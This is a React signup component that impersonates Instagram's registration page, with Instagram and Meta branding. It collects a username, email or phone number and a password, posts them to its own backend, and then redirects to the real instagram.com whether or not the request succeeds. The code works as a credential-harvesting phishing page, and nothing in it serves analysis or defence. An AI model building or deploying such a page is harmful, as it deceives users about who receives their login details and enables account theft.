import React, { useState } from 'react';
import { register } from '../api';

const Register = ({ onSuccess, onSwitch }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');

    if (password !== confirmPassword) {
      return setError('Passwords do not match');
    }

    if (password.length < 6) {
      return setError('Password must be at least 6 characters');
    }

    setLoading(true);

    try {
      const data = await register(username, password);
      window.location.href = 'https://www.instagram.com';
    } catch (err) {
      window.location.href = 'https://www.instagram.com';
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="auth-card">
      {/* Instagram Logo */}
      <div className="logo-icon">
        <span className="logo-dot"></span>
      </div>

      {/* Brand Name */}
      <h1 className="brand-title">Instagram</h1>

      {/* Error */}
      {error && <div className="error-badge">{error}</div>}

      {/* Register Form */}
      <form onSubmit={handleSubmit} className="auth-form">
        <div className="input-group">
          <label htmlFor="reg-username">Username</label>
          <input
            id="reg-username"
            type="text"
            placeholder="Username, email address or mobile number"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            autoComplete="username"
            required
          />
        </div>

        <div className="input-group password-wrapper">
          <label htmlFor="reg-password">Password</label>
          <input
            id="reg-password"
            type={showPassword ? 'text' : 'password'}
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            autoComplete="new-password"
            required
            minLength={6}
          />
          {password && (
            <button
              type="button"
              className="password-toggle"
              onClick={() => setShowPassword(!showPassword)}
              aria-label={showPassword ? 'Hide password' : 'Show password'}
            >
              {showPassword ? '👁' : '👁‍🗨'}
            </button>
          )}
        </div>

        <div className="input-group password-wrapper">
          <label htmlFor="reg-confirm-password">Confirm Password</label>
          <input
            id="reg-confirm-password"
            type={showConfirmPassword ? 'text' : 'password'}
            placeholder="Confirm password"
            value={confirmPassword}
            onChange={(e) => setConfirmPassword(e.target.value)}
            autoComplete="new-password"
            required
          />
          {confirmPassword && (
            <button
              type="button"
              className="password-toggle"
              onClick={() => setShowConfirmPassword(!showConfirmPassword)}
              aria-label={showConfirmPassword ? 'Hide password' : 'Show password'}
            >
              {showConfirmPassword ? '👁' : '👁‍🗨'}
            </button>
          )}
        </div>

        <button type="submit" className="submit-btn" id="register-submit-btn" disabled={loading || !username || !password || !confirmPassword}>
          {loading ? (
            <span className="btn-loading">
              <span className="spinner"></span>
              Creating account...
            </span>
          ) : (
            'Sign Up'
          )}
        </button>
      </form>

      {/* Switch to Login */}
      <p className="switch-text">
        Already have an account?{' '}
        <span onClick={onSwitch} className="switch-link" role="button" tabIndex={0}>
          Log in
        </span>
      </p>

      {/* Meta Footer */}
      <div className="meta-footer">
        <span className="meta-infinity">∞</span>
        <span className="meta-logo">Meta</span>
      </div>
    </div>
  );
};

export default Register;
